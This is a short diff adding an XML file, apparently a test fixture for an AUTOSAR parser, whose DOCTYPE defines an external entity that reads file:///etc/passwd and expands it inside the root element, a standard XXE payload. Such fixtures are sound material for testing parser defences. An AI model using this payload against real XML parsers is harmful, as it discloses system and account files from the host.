@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE AUTOSAR [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<AUTOSAR>&xxe;</AUTOSAR>
